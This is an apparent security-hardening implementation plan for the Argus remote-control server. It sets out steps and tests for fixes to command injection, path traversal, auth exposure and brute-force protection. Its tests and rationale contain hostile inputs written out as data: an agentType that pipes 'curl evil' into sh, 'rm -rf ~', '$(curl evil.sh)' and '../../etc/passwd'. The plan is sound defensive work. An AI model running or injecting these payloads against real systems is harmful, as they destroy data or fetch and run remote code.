# Argus Security Hardening & Stability Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Close the internet-facing RCE/auth gaps, harden the single credential, eliminate process-crash cliffs, and fix the optimistic-delete client bug — without changing the product's intended remote-control behavior.

**Architecture:** Argus is, by design, a remote-control surface for Claude CLI sessions (typing into a pty = arbitrary shell). The work below does not remove that capability; it ensures (a) auth is enforced whenever the server is reachable off-loopback, (b) the one shared credential resists brute force, (c) every shell-bound input is validated/scoped, and (d) the server and Electron host fail safe instead of crashing or duplicating.

**Tech Stack:** Node ESM + TypeScript (strict), Express 4, Socket.io, node-pty + tmux, React + Vite + xterm.js, Electron, electron-builder.

---

## Test-runner reconciliation (READ FIRST — overrides the per-task snippets where noted)

Two runners, by workspace, decided deliberately:

- **`server/`** → **`node:test` + `tsx`**. This already exists and is green: `server/package.json` → `"test": "node --import tsx --test 'src/**/*.test.ts'"`, 44 tests passing (~18s), four existing files (`pathScope.test.ts`, `PtyManager.test.ts`, `AuthService.test.ts`, `StateDetector.test.ts`). `tsconfig.json` excludes `src/**/*.test.ts` from the build so tests never ship. **No vitest is added to the server.** Tasks 1–3 below are already written in `node:test` style. **Tasks 4–6 were drafted in vitest and MUST be transcribed to `node:test`** using the recipe below; drop their "bootstrap vitest" step and the `*.vitest.ts` suffix (use `*.test.ts`).
- **`client/`** → **vitest + jsdom + @testing-library**. No client test infra exists today, so Task 9 stands it up from zero. Vitest is the natural fit for a Vite project.

**vitest → node:test transcription recipe (apply to Tasks 4–6 test blocks):**

```ts
// header
import { test, mock } from 'node:test';
import assert from 'node:assert/strict';

// describe('Group', () => { it('does x', () => {...}) })   →   test('Group > does x', () => {...})
// expect(a).toBe(b)            → assert.equal(a, b)
// expect(a).toEqual(b)         → assert.deepEqual(a, b)
// expect(a).toBeGreaterThan(b) → assert.ok(a > b)
// expect(a).toBeLessThan(b)    → assert.ok(a < b)
// expect(a).toBeInstanceOf(C)  → assert.ok(a instanceof C)
// expect(s).toContain(x)       → assert.ok(s.includes(x))
// await expect(p).rejects.toThrow(/re/) → await assert.rejects(() => p, /re/)
// vi.fn()                      → mock.fn()        (assert via .mock.calls.length)
// vi.spyOn(obj,'m').mockImplementation(fn) → mock.method(obj, 'm', fn)   (auto-restored at test end)
// vi.stubGlobal(name, val)     → not needed server-side; inject deps instead
```

Run a single server test fast: `cd server && node --import tsx --test src/path/to/X.test.ts`. Full suite: `cd server && npm test`.

## Execution sequencing

Independent branches; recommended order maximizes shared-context reuse and ships the security set as one reviewable unit:

1. **Security PR** (one branch or three stacked): Task 2 → Task 3 → Task 1 → Task 5 → Task 4. (2/3 are localized; 1 has the only cross-file `index.ts` wiring; 4/5 layer onto auth.)
2. **Stability PR**: Task 6 (global error handling) → Task 7 (single-instance + port conflict).
3. **Client PR**: Task 9.
4. **Upgrade PR**: Task 8 (Electron) — last, verification-heavy, isolatable.

All commit messages carry the repo trailer: `Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>`.

---

# SECURITY CLUSTER (server, `node:test`)

### Task 2: Validate `agentType` to close command injection — [CRITICAL]

**Why:** `sessions.ts:92` takes `agentType` from the request unvalidated; an unregistered value flows to `command = agentDef?.command ?? resolvedAgentType` (`SessionManager.ts:195`), `resolveCommand` returns it unchanged when `which` fails (`PtyManager.ts:74`), then it is interpolated **raw** into `sh -l -c 'exec <command> …'` (`PtyManager.ts:200`). `agentType:"claude; curl evil|sh"` executes. This bypasses the `COMMAND_PATTERN` check that custom agents already pass (`config.ts:33`).

**Design decision:** the check lives in **`SessionManager`, not the route** — because `restartSession` (308) and `restoreSessions` (537 → createSession) also resolve agents and never touch the create route. One chokepoint covers create + restart + restore. Error contract: `throw new Error(\`Unknown agent type: "${x}"\`)`; the create route maps thrown errors → 400, restart → 404 (existing catches, no route change). Restore's existing `catch` (539) quarantines a poisoned persisted record (logs + skips) instead of spawning it.

**Files:**
- Modify: `server/src/services/AgentRegistry.ts` (add `isRegistered`, after `getById` ~line 42)
- Modify: `server/src/services/SessionManager.ts` (`createSession` after line 191; `restartSession` after line 307)
- Test: `server/src/services/AgentRegistry.test.ts` (new), `server/src/services/SessionManager.injection.test.ts` (new)

- [ ] **Step 1: Failing test — registry membership.** New `server/src/services/AgentRegistry.test.ts`:
  ```ts
  import { test } from 'node:test';
  import assert from 'node:assert/strict';
  import { AgentRegistry } from './AgentRegistry.js';

  test('builtins are registered', () => {
    const r = new AgentRegistry();
    assert.equal(r.isRegistered('claude', []), true);
    assert.equal(r.isRegistered('gemini', []), true);
    assert.equal(r.isRegistered('codex', []), true);
  });
  test('custom agents are registered', () => {
    const r = new AgentRegistry();
    const custom = [{ id: 'aider', name: 'Aider', command: 'aider', builtin: false }];
    assert.equal(r.isRegistered('aider', custom), true);
  });
  test('unregistered / injection payloads are rejected', () => {
    const r = new AgentRegistry();
    assert.equal(r.isRegistered('claude; rm -rf ~', []), false);
    assert.equal(r.isRegistered('$(curl evil.sh)', []), false);
    assert.equal(r.isRegistered('', []), false);
  });
  ```
- [ ] **Step 2: Run — expect fail.** `cd server && node --import tsx --test src/services/AgentRegistry.test.ts` → `r.isRegistered is not a function`. (Confirm the builtin ids `claude`/`gemini`/`codex` against the actual registry constructor; adjust the test ids if they differ.)
- [ ] **Step 3: Implement `isRegistered`.** In `AgentRegistry.ts`, after `getById`:
  ```ts
  isRegistered(id: string, customAgents: AgentDefinition[]): boolean {
    return this.getById(id, customAgents) !== undefined;
  }
  ```
- [ ] **Step 4: Run — expect pass.**
- [ ] **Step 5: Commit.** `git checkout -b security/agent-validation && git add server/src/services/AgentRegistry.ts server/src/services/AgentRegistry.test.ts && git commit -m "feat(agents): add AgentRegistry.isRegistered membership check"`
- [ ] **Step 6: Guard `createSession`.** In `SessionManager.ts`, after line 191 (`resolvedAgentType` computed, `config` already loaded) and before the `agentDef` lookup at 194:
  ```ts
  // Reject any agentType that doesn't resolve to a registered agent — otherwise
  // `command = agentDef?.command ?? resolvedAgentType` turns an arbitrary string
  // into a raw shell word (PtyManager interpolates it into `sh -l -c`).
  if (!this.agentRegistry.isRegistered(resolvedAgentType, config.customAgents)) {
    throw new Error(`Unknown agent type: "${resolvedAgentType}"`);
  }
  ```
- [ ] **Step 7: Guard `restartSession`.** After `const config = await this.configStore.load();` (307), before the `agentDef` lookup (308):
  ```ts
  if (!this.agentRegistry.isRegistered(session.agentType, config.customAgents)) {
    throw new Error(`Unknown agent type: "${session.agentType}"`);
  }
  ```
- [ ] **Step 8: Failing→passing test — SessionManager rejects.** New `server/src/services/SessionManager.injection.test.ts` (mirror the real `ConfigStore.load` shape from `persistence/ConfigStore.ts`):
  ```ts
  import { test } from 'node:test';
  import assert from 'node:assert/strict';
  import os from 'os';
  import { SessionManager } from './SessionManager.js';

  test('createSession rejects an unregistered agentType', async () => {
    const fakeConfig = { load: async () => ({ defaultAgent: 'claude', customAgents: [], agentFlags: {} }), save: async () => {} } as any;
    const sm = new SessionManager(os.tmpdir(), fakeConfig);
    await assert.rejects(
      () => sm.createSession(os.tmpdir(), 'x', 'claude; rm -rf ~'),
      /Unknown agent type/,
    );
  });
  ```
  Run it → the guard (already implemented) makes it pass; the rejection fires after `access(folderPath)` succeeds on tmpdir, before any pty spawn. If it errors on config shape, fix the stub until the rejection is specifically `/Unknown agent type/`.
- [ ] **Step 9: Commit.** `git add server/src/services/SessionManager.ts server/src/services/SessionManager.injection.test.ts && git commit -m "fix(sessions): reject unregistered agentType in create/restart/restore to block command injection"`

---

### Task 3: Path-guard the unprotected git mutation routes — [CRITICAL]

**Why:** `git-add`/`git-unstage`/`git-ignore`/`git-stage-patch`/`git-discard-patch` presence-check `filePath` but skip the `..`/absolute guard that `diff-file`/`blame`/`revert` apply (`git.ts:105,188,225`). `git-ignore` appends attacker content to a `.gitignore` outside the session dir; others escape the repo. `checkout`/`create-branch` refs allow leading-dash option injection.

**Design decision:** GitService receives `filePath` **relative** to `folderPath` (runs git with `cwd: folderPath` + `--`), so the existing guards reject `startsWith('/')`. `resolveWithinBase` requires an *absolute* input — wrong primitive. Add **`resolveRelativeWithinBase(base, rawPath)`** that `path.resolve`s against base then containment-checks; returns `null` on escape so each handler 400s. We only reject before calling git; we do not change what's passed to git for valid inputs.

**Files:**
- Modify: `server/src/utils/pathScope.ts` (add `resolveRelativeWithinBase`)
- Modify: `server/src/routes/git.ts` — `git-add` (112), `git-unstage` (195), `git-ignore` (232), `git-stage-patch` (134), `git-discard-patch` (151), `git-checkout` branch (261), `git-create-branch` name+from (278)
- Test: `server/src/utils/pathScope.test.ts` (extend), `server/src/routes/git.guard.test.ts` (new)

- [ ] **Step 1: Failing test — relative containment.** Append to `pathScope.test.ts` (reuse its existing `BASE` const, e.g. `/home/u/project`):
  ```ts
  import { resolveRelativeWithinBase } from './pathScope.js';
  test('relative: accepts a normal relative file', () => {
    assert.equal(resolveRelativeWithinBase(BASE, 'src/index.ts'), `${BASE}/src/index.ts`);
  });
  test('relative: accepts an absolute path inside the base', () => {
    assert.equal(resolveRelativeWithinBase(BASE, `${BASE}/a.ts`), `${BASE}/a.ts`);
  });
  test('relative: rejects ../ traversal escape', () => {
    assert.equal(resolveRelativeWithinBase(BASE, '../../etc/passwd'), null);
  });
  test('relative: rejects an absolute path outside the base', () => {
    assert.equal(resolveRelativeWithinBase(BASE, '/etc/passwd'), null);
  });
  test('relative: rejects empty input', () => {
    assert.equal(resolveRelativeWithinBase(BASE, ''), null);
  });
  ```
- [ ] **Step 2: Run — expect fail.** `cd server && node --import tsx --test src/utils/pathScope.test.ts` → not exported.
- [ ] **Step 3: Implement helper.** Append to `pathScope.ts`:
  ```ts
  /**
   * Like resolveWithinBase, but `rawPath` may be relative to `base` (git mutation
   * routes pass repo-relative file paths). Resolves against `base`, then confirms
   * containment. Returns the normalized absolute path, or null on escape/empty.
   */
  export function resolveRelativeWithinBase(base: string, rawPath: string): string | null {
    if (!rawPath) return null;
    const resolved = path.resolve(base, rawPath);
    if (resolved === base || resolved.startsWith(base + path.sep)) return resolved;
    return null;
  }
  ```
- [ ] **Step 4: Run — expect pass.**
- [ ] **Step 5: Commit.** `git checkout -b security/git-path-guard && git add server/src/utils/pathScope.ts server/src/utils/pathScope.test.ts && git commit -m "feat(pathScope): add resolveRelativeWithinBase for repo-relative path containment"`
- [ ] **Step 6: Guard the handlers.** Add `import { resolveRelativeWithinBase } from '../utils/pathScope.js';` at the top of `git.ts`. After each existing presence-check, insert (matching that handler's error envelope — `{error}` for git-add, `{success,error}` for the others):
  - `git-add` (after the `if (!filePath)` block, ~116):
    ```ts
    if (!resolveRelativeWithinBase(session.folderPath, filePath)) {
      res.status(400).json({ error: 'Invalid file path' });
      return;
    }
    ```
  - `git-unstage` (~199) and `git-ignore` (~236): same, with `{ success: false, error: 'Invalid file path' }`.
  - `git-stage-patch` (~137) and `git-discard-patch` (~154):
    ```ts
    if (
      !resolveRelativeWithinBase(session.folderPath, selection.filePath) ||
      (selection.fromPath && !resolveRelativeWithinBase(session.folderPath, selection.fromPath))
    ) {
      res.status(400).json({ success: false, error: 'Invalid file path' });
      return;
    }
    ```
  - `git-checkout` (after `if (!branch?.trim())`, ~264):
    ```ts
    if (/^-/.test(branch.trim()) || branch.includes('..')) {
      res.status(400).json({ success: false, error: 'Invalid branch name' });
      return;
    }
    ```
  - `git-create-branch` (after `if (!name?.trim())`, ~281):
    ```ts
    if (/^-/.test(name.trim()) || name.includes('..') || (from && (/^-/.test(from) || from.includes('..')))) {
      res.status(400).json({ success: false, error: 'Invalid branch name' });
      return;
    }
    ```
- [ ] **Step 7: Failing→passing route test.** New `server/src/routes/git.guard.test.ts` — invoke the `git-add` handler directly off the router stack with a fake manager whose `getSessionInfo` returns `{ id:'s1', folderPath:'/home/u/project' }` and a `GitService` whose `stageFile` throws if reached; assert a `../../etc/passwd` filePath yields 400 before git is touched. (If `router.stack[].route.stack` internals prove brittle, mount on an `express()` app and drive via Node's built-in `http` against an ephemeral port — no new dep.)
  ```ts
  import { test } from 'node:test';
  import assert from 'node:assert/strict';
  import { createGitRoutes } from './git.js';

  function handlerFor(method: string, pathSuffix: string) {
    const fakeManager = { getSessionInfo: () => ({ id: 's1', folderPath: '/home/u/project' }) } as any;
    const fakeGit = { stageFile: async () => { throw new Error('git reached for an escaping path'); } } as any;
    const router = createGitRoutes(fakeManager, fakeGit, {} as any, {} as any);
    const layer = router.stack.find((l: any) => l.route?.path === pathSuffix && l.route?.methods[method]);
    return layer.route.stack[layer.route.stack.length - 1].handle;
  }

  test('git-add rejects ../ traversal with 400 before touching git', async () => {
    const handle = handlerFor('post', '/sessions/:id/git-add');
    let status = 0; let body: any;
    const req = { params: { id: 's1' }, body: { filePath: '../../etc/passwd' } } as any;
    const res = { status(c: number) { status = c; return this; }, json(b: any) { body = b; return this; } } as any;
    await handle(req, res, () => {});
    assert.equal(status, 400);
    assert.ok(String(body.error).includes('Invalid file path'));
  });
  ```
  (Verify `createGitRoutes`' real arity/signature before finalizing the fake args.)
- [ ] **Step 8: Full suite.** `cd server && npm test` → green.
- [ ] **Step 9: Commit.** `git add server/src/routes/git.ts server/src/routes/git.guard.test.ts && git commit -m "fix(git): path-guard git-add/unstage/ignore/stage-patch/discard-patch and branch refs"`

---

### Task 1: Enforce auth whenever the server is exposed — [CRITICAL]

**Why:** `auth.ts:13` gates on `authService.enabled`, set true only inside the in-app ngrok-start flow (`ngrok.ts:35`). So `ngrok http 5757` from a terminal, a reused tunnel adopted by `pollNgrokApi` (`NgrokService.ts:92`, which adopts **any** https tunnel on :4040), or `ARGUS_HOST=0.0.0.0` (`index.ts:34`) all expose the full API + pty I/O with auth **disabled**.

**Design decisions:**
- `AuthService` gains private `exposed` + `setExposed(v)` + getter `enforced = (passwordHash !== null) || exposed`. Middleware gates on `enforced`.
- Exposure set from two places: (a) `index.ts` at bind time when HOST is non-loopback; (b) `NgrokService` on connect (both spawn + adopt paths), cleared on stop/disconnect via an `onExposureChange` callback.
- **Fail-closed:** `enforced && !enabled` (exposed, no password) → **503** on protected `/api/` routes; public paths (`/api/auth/*`, `/api/ngrok/status`, `/api/health`) stay open so the client can drive set-password. Exposure must never serve session/git data password-less.
- `pollNgrokApi(port)` only adopts a tunnel whose `config.addr` ends with `:<port>`.

**Files:**
- Modify: `server/src/services/AuthService.ts` (exposure state + `enforced`)
- Modify: `server/src/middleware/auth.ts` (gate on `enforced`; 503 fail-closed branch)
- Modify: `server/src/services/NgrokService.ts` (`selectTunnel` export + port match in `pollNgrokApi`; `onExposureChange` calls)
- Modify: `server/src/index.ts` (loopback check → `setExposed`; ngrok callback wiring; `authRequired` reporting)
- Test: extend `AuthService.test.ts`; new `NgrokService.test.ts`, `middleware/auth.test.ts`

- [ ] **Step 1: Failing test — exposure gate.** Append to `AuthService.test.ts`:
  ```ts
  test('enforced is true when exposed even without a password', () => {
    const auth = new AuthService();
    assert.equal(auth.enabled, false);
    assert.equal(auth.enforced, false);
    auth.setExposed(true);
    assert.equal(auth.enabled, false);
    assert.equal(auth.enforced, true);
    auth.setExposed(false);
    assert.equal(auth.enforced, false);
  });
  ```
- [ ] **Step 2: Run — expect fail.** `node --import tsx --test src/services/AuthService.test.ts`.
- [ ] **Step 3: Implement.** In `AuthService.ts` add `private exposed = false;` and near the `enabled` getter:
  ```ts
  get enforced(): boolean { return this.passwordHash !== null || this.exposed; }
  setExposed(value: boolean): void { this.exposed = value; }
  ```
- [ ] **Step 4: Run — expect pass.**
- [ ] **Step 5: Commit.** `git checkout -b security/auth-exposure && git add server/src/services/AuthService.ts server/src/services/AuthService.test.ts && git commit -m "feat(auth): track exposure independent of password (enforced getter)"`
- [ ] **Step 6: Failing test — tunnel port match.** New `server/src/services/NgrokService.test.ts`:
  ```ts
  import { test } from 'node:test';
  import assert from 'node:assert/strict';
  import { selectTunnel } from './NgrokService.js';

  test('adopts an https tunnel forwarding to the expected port', () => {
    const t = [{ public_url: 'https://abc.ngrok.io', config: { addr: 'http://localhost:5402' } }];
    assert.equal(selectTunnel(t, 5402), 'https://abc.ngrok.io');
  });
  test('ignores a tunnel forwarding to a different port', () => {
    const t = [{ public_url: 'https://evil.ngrok.io', config: { addr: 'http://localhost:9999' } }];
    assert.equal(selectTunnel(t, 5402), null);
  });
  test('ignores non-https tunnels', () => {
    const t = [{ public_url: 'http://abc.ngrok.io', config: { addr: 'http://localhost:5402' } }];
    assert.equal(selectTunnel(t, 5402), null);
  });
  ```
- [ ] **Step 7: Run — expect fail**, then implement `selectTunnel` + wire `pollNgrokApi`. In `NgrokService.ts`:
  ```ts
  type NgrokTunnel = { public_url?: string; config?: { addr?: string } };
  export function selectTunnel(tunnels: NgrokTunnel[], port: number): string | null {
    const match = tunnels.find(
      (t) => t.public_url?.startsWith('https://') && new RegExp(`:${port}$`).test(t.config?.addr ?? ''),
    );
    return match?.public_url ?? null;
  }
  ```
  Change `pollNgrokApi` to take `port: number`; replace its parse body with `resolve(selectTunnel((JSON.parse(body) as { tunnels: NgrokTunnel[] }).tunnels || [], port))`. Update both call sites (92, 149) to pass `port` (already in `start`'s scope).
- [ ] **Step 8: Run — expect pass.**
- [ ] **Step 9: Wire exposure callback.** Add `public onExposureChange: ((exposed: boolean) => void) | null = null;`. Call `this.onExposureChange?.(true)` after each successful connect (adopt path ~97, poll path ~156); `this.onExposureChange?.(false)` in `stop()` (~185) and the `exit` handler (~130). Commit: `git add server/src/services/NgrokService.ts server/src/services/NgrokService.test.ts && git commit -m "fix(ngrok): only adopt tunnels forwarding to the expected port; signal exposure"`
- [ ] **Step 10: Failing test — middleware fail-closed.** New `server/src/middleware/auth.test.ts`:
  ```ts
  import { test } from 'node:test';
  import assert from 'node:assert/strict';
  import { createAuthMiddleware } from './auth.js';
  import { AuthService } from '../services/AuthService.js';

  function run(auth: AuthService, path: string, authHeader?: string) {
    const mw = createAuthMiddleware(auth);
    let status = 0; let nexted = false;
    const req = { path, headers: authHeader ? { authorization: authHeader } : {} } as any;
    const res = { status(c: number) { status = c; return this; }, json() { return this; } } as any;
    mw(req, res, () => { nexted = true; });
    return { status, nexted };
  }
  test('passes through when neither enabled nor exposed', () => {
    assert.equal(run(new AuthService(), '/api/sessions').nexted, true);
  });
  test('exposed without password: 503 on protected route, public open', () => {
    const a = new AuthService(); a.setExposed(true);
    assert.equal(run(a, '/api/sessions').status, 503);
    assert.equal(run(a, '/api/health').nexted, true);
    assert.equal(run(a, '/api/auth/login').nexted, true);
  });
  test('exposed with password: requires a valid bearer token', () => {
    const a = new AuthService(); a.setExposed(true); a.setPassword('correct horse battery staple');
    assert.equal(run(a, '/api/sessions').status, 401);
    assert.equal(run(a, '/api/sessions', `Bearer ${a.generateToken()}`).nexted, true);
  });
  ```
- [ ] **Step 11: Run — expect fail**, then implement. In `auth.ts` replace the `if (!authService.enabled)` block with `if (!authService.enforced) { next(); return; }`, and after the PUBLIC_PATHS / non-`/api/` early returns add:
  ```ts
  if (!authService.enabled) {
    res.status(503).json({ error: 'Server is exposed but no access password is set' });
    return;
  }
  ```
- [ ] **Step 12: Run — expect pass.**
- [ ] **Step 13: Wire bind-time + ngrok in `index.ts`.** Near line 38: `const isLoopback = HOST === '127.0.0.1' || HOST === '::1' || HOST === 'localhost';`. After `authService` is constructed (~119): `authService.setExposed(!isLoopback);`. After ngrok service exists (~128): `ngrokService.onExposureChange = (exposed) => authService.setExposed(exposed || !isLoopback);`. Update `getAuthRequired`/`authRequired` reporting (ngrok.ts:17,56 and index.ts:127) to use `authService.enforced` so the client sees the true gate.
- [ ] **Step 14: Full suite + commit.** `cd server && npm test` green. `git add server/src/middleware/auth.ts server/src/middleware/auth.test.ts server/src/index.ts server/src/routes/ngrok.ts && git commit -m "feat(auth): enforce auth on non-loopback bind or active tunnel, fail-closed without password"`

---

### Task 5: Gate the unauthenticated `/api/debug/scroll` sink — [HIGH]

**Why:** Mounted **before** auth (`index.ts:85`), `appendFileSync` up to 1MB/call, no cap. Over a tunnel: unauthenticated disk-fill DoS + attacker-controlled file write + synchronous hot-path stall.

**Design decision:** Register the route only when a dev gate is open (`ARGUS_DEBUG_SCROLL==='1'` or `NODE_ENV!=='production'`), **and move the mount below the auth middleware** so a token is required once auth is enabled. Production-without-flag = route not registered = 404. Async `fs.promises.appendFile`; truncate-and-restart at 5MB. Extract to a testable module.

> Tests below use `node:test` (transcribe per the recipe — these are the converted forms).

**Files:**
- Create: `server/src/routes/debugScroll.ts`
- Modify: `server/src/index.ts:82-94` (relocate below the `createAuthMiddleware` mount, replace handler)
- Test: `server/src/routes/debugScroll.test.ts`

- [ ] **Step 1: Failing test.** New `server/src/routes/debugScroll.test.ts`:
  ```ts
  import { test } from 'node:test';
  import assert from 'node:assert/strict';
  import os from 'os'; import path from 'path'; import fs from 'fs';
  import { isDebugScrollEnabled, writeScrollTrace, MAX_DEBUG_LOG_BYTES } from './debugScroll.js';

  test('gate > disabled in production without flag', () => {
    assert.equal(isDebugScrollEnabled({ NODE_ENV: 'production' } as any), false);
  });
  test('gate > enabled with ARGUS_DEBUG_SCROLL=1 in production', () => {
    assert.equal(isDebugScrollEnabled({ NODE_ENV: 'production', ARGUS_DEBUG_SCROLL: '1' } as any), true);
  });
  test('gate > enabled in non-production', () => {
    assert.equal(isDebugScrollEnabled({ NODE_ENV: 'development' } as any), true);
  });
  test('size cap > truncates when over the cap', async () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'argus-scroll-'));
    const file = path.join(dir, 'scroll-debug.log');
    fs.writeFileSync(file, 'x'.repeat(MAX_DEBUG_LOG_BYTES + 10));
    await writeScrollTrace(dir, 'new-trace');
    assert.ok(fs.statSync(file).size < MAX_DEBUG_LOG_BYTES);
    assert.ok(fs.readFileSync(file, 'utf8').includes('new-trace'));
    fs.rmSync(dir, { recursive: true, force: true });
  });
  ```
- [ ] **Step 2: Run — expect fail.**
- [ ] **Step 3: Implement module.** New `server/src/routes/debugScroll.ts`:
  ```ts
  import path from 'path';
  import fs from 'fs/promises';
  export const MAX_DEBUG_LOG_BYTES = 5 * 1024 * 1024;
  export function isDebugScrollEnabled(env: NodeJS.ProcessEnv = process.env): boolean {
    return env.ARGUS_DEBUG_SCROLL === '1' || env.NODE_ENV !== 'production';
  }
  export async function writeScrollTrace(dataDir: string, body: string): Promise<void> {
    const file = path.join(dataDir, 'scroll-debug.log');
    const entry = `\n===== ${new Date().toISOString()} =====\n${body}\n`;
    try {
      const st = await fs.stat(file).catch(() => null);
      if (st && st.size > MAX_DEBUG_LOG_BYTES) { await fs.writeFile(file, entry); return; }
      await fs.appendFile(file, entry);
    } catch { /* best-effort */ }
  }
  ```
- [ ] **Step 4: Run — expect pass.**
- [ ] **Step 5: Relocate + replace in `index.ts`.** Delete lines 82-94. After `app.use(createAuthMiddleware(authService));` (~122) add:
  ```ts
  // Dev-only scroll-trace sink: gated behind a dev flag AND (when auth is enabled)
  // the auth middleware above. No longer a pre-auth, uncapped sink.
  if (isDebugScrollEnabled()) {
    app.use('/api/debug/scroll', express.text({ type: '*/*', limit: '1mb' }));
    app.post('/api/debug/scroll', (req, res) => {
      void writeScrollTrace(dataDir, typeof req.body === 'string' ? req.body : '');
      res.status(204).end();
    });
  }
  ```
  Import `{ isDebugScrollEnabled, writeScrollTrace }` from `./routes/debugScroll.js`.
- [ ] **Step 6: Build + commit.** `npm run build -w server`. `git add server/src/routes/debugScroll.ts server/src/routes/debugScroll.test.ts server/src/index.ts && git commit -m "fix(server): gate debug scroll sink behind dev flag, auth, and async size cap"`

---

### Task 4: Brute-force protection + password strength — [HIGH]

**Why:** No rate limit/lockout on `/api/auth/login` (`auth.ts:24`) or `/api/ngrok/start`; password minimum is 4 chars (`ngrok.ts:27`). This single shared password is the only gate on internet-facing RCE.

**Design decisions (justified):**
- **In-memory limiter, no new dep.** Single-process, single-user app; ~40 lines beats `express-rate-limit`'s store abstraction. Key by `req.ip`.
- **IP caveat (documented, not worked around):** no `trust proxy` is set and ngrok dials localhost, so over a tunnel every request presents `req.ip === '127.0.0.1'` → one shared bucket. Acceptable (one legitimate password). Direct-LAN (`0.0.0.0`) still gets per-source buckets. Do **not** add `trust proxy` — a spoofed `X-Forwarded-For` would evade the limiter.
- **Strength:** `MIN_PASSWORD_LENGTH=12` + ~20-entry common list. `zxcvbn` rejected (heavy) for a single self-set password.
- **Responses:** weak → 400 `{error}`; locked → 429 `{error, retryAfterSeconds}` + `Retry-After` header; wrong-but-not-locked → existing 401 (now records the failure).

> Tests below shown in `node:test` form (transcribed). Pure-function tests convert trivially.

**Files:**
- Create: `server/src/services/passwordStrength.ts`, `server/src/services/LoginRateLimiter.ts`
- Modify: `server/src/routes/auth.ts` (login lockout + record), `server/src/routes/ngrok.ts:26-30` (strength + lockout), `server/src/index.ts` (instantiate + thread limiter)
- Test: `server/src/services/passwordStrength.test.ts`, `server/src/services/LoginRateLimiter.test.ts`

- [ ] **Step 1: Failing test — strength.** New `server/src/services/passwordStrength.test.ts`:
  ```ts
  import { test } from 'node:test';
  import assert from 'node:assert/strict';
  import { validatePasswordStrength } from './passwordStrength.js';
  test('rejects short passwords', () => {
    assert.deepEqual(validatePasswordStrength('short1!'), { ok: false, reason: 'Password must be at least 12 characters' });
  });
  test('rejects common passwords even if long', () => {
    assert.equal(validatePasswordStrength('password1234').ok, false);
  });
  test('accepts a strong password', () => {
    assert.deepEqual(validatePasswordStrength('correct horse battery staple'), { ok: true });
  });
  ```
- [ ] **Step 2: Run — expect fail**, then implement `server/src/services/passwordStrength.ts`:
  ```ts
  export const MIN_PASSWORD_LENGTH = 12;
  const COMMON = new Set([
    'password', 'password1', 'password123', 'password1234', '123456789012',
    'qwertyuiop', 'letmein12345', 'iloveyou1234', 'admin1234567', 'changeme1234',
  ]);
  export type StrengthResult = { ok: true } | { ok: false; reason: string };
  export function validatePasswordStrength(pw: string): StrengthResult {
    if (pw.length < MIN_PASSWORD_LENGTH) return { ok: false, reason: `Password must be at least ${MIN_PASSWORD_LENGTH} characters` };
    if (COMMON.has(pw.toLowerCase())) return { ok: false, reason: 'Password is too common' };
    return { ok: true };
  }
  ```
- [ ] **Step 3: Run — expect pass.**
- [ ] **Step 4: Failing test — limiter.** New `server/src/services/LoginRateLimiter.test.ts`:
  ```ts
  import { test } from 'node:test';
  import assert from 'node:assert/strict';
  import { LoginRateLimiter } from './LoginRateLimiter.js';
  test('allows attempts under the threshold', () => {
    const l = new LoginRateLimiter({ maxFailures: 3, baseLockoutMs: 1000 });
    assert.equal(l.check('1.1.1.1').locked, false);
  });
  test('locks after maxFailures with a positive retryAfter', () => {
    const l = new LoginRateLimiter({ maxFailures: 3, baseLockoutMs: 1000 });
    l.recordFailure('2.2.2.2'); l.recordFailure('2.2.2.2'); l.recordFailure('2.2.2.2');
    const r = l.check('2.2.2.2');
    assert.equal(r.locked, true);
    assert.ok((r.retryAfterSeconds ?? 0) > 0);
  });
  test('exponential backoff grows the window', () => {
    const l = new LoginRateLimiter({ maxFailures: 1, baseLockoutMs: 1000 });
    l.recordFailure('3.3.3.3'); const first = l.check('3.3.3.3').retryAfterSeconds!;
    l.recordFailure('3.3.3.3'); const second = l.check('3.3.3.3').retryAfterSeconds!;
    assert.ok(second > first);
  });
  test('recordSuccess resets the counter', () => {
    const l = new LoginRateLimiter({ maxFailures: 1, baseLockoutMs: 1000 });
    l.recordFailure('4.4.4.4'); l.recordSuccess('4.4.4.4');
    assert.equal(l.check('4.4.4.4').locked, false);
  });
  ```
- [ ] **Step 5: Run — expect fail**, then implement `server/src/services/LoginRateLimiter.ts`:
  ```ts
  // Per-IP failed-login limiter with exponential lockout. In-memory, single-process.
  // NOTE: ngrok dials localhost, so over a tunnel every request presents
  // req.ip === 127.0.0.1 and shares one bucket — acceptable for a single-password
  // app. Direct LAN (ARGUS_HOST=0.0.0.0) still gets per-source buckets. We do NOT
  // trust X-Forwarded-For (no app.set('trust proxy')), so a spoofed header can't evade.
  interface Entry { failures: number; lockedUntil: number; }
  export interface LimiterOpts { maxFailures: number; baseLockoutMs: number; }
  export interface CheckResult { locked: boolean; retryAfterSeconds?: number; }
  export class LoginRateLimiter {
    private entries = new Map<string, Entry>();
    constructor(private opts: LimiterOpts = { maxFailures: 5, baseLockoutMs: 30_000 }) {}
    check(ip: string): CheckResult {
      const e = this.entries.get(ip);
      if (!e) return { locked: false };
      const remaining = e.lockedUntil - Date.now();
      if (remaining > 0) return { locked: true, retryAfterSeconds: Math.ceil(remaining / 1000) };
      return { locked: false };
    }
    recordFailure(ip: string): void {
      const e = this.entries.get(ip) ?? { failures: 0, lockedUntil: 0 };
      e.failures += 1;
      if (e.failures >= this.opts.maxFailures) {
        const over = e.failures - this.opts.maxFailures;
        e.lockedUntil = Date.now() + this.opts.baseLockoutMs * Math.pow(2, over);
      }
      this.entries.set(ip, e);
    }
    recordSuccess(ip: string): void { this.entries.delete(ip); }
  }
  ```
  (`Date.now()` is fine in production code; only the Workflow script sandbox forbids it.)
- [ ] **Step 6: Run — expect pass.**
- [ ] **Step 7: Wire login (`auth.ts`).** Change `createAuthRoutes(authService)` → `createAuthRoutes(authService, loginLimiter: LoginRateLimiter)`. In `POST /login`, after the `enabled` guard and before reading password:
  ```ts
  const ip = req.ip ?? 'unknown';
  const gate = loginLimiter.check(ip);
  if (gate.locked) {
    res.setHeader('Retry-After', String(gate.retryAfterSeconds));
    res.status(429).json({ error: `Too many failed attempts. Try again in ${gate.retryAfterSeconds} seconds.`, retryAfterSeconds: gate.retryAfterSeconds });
    return;
  }
  ```
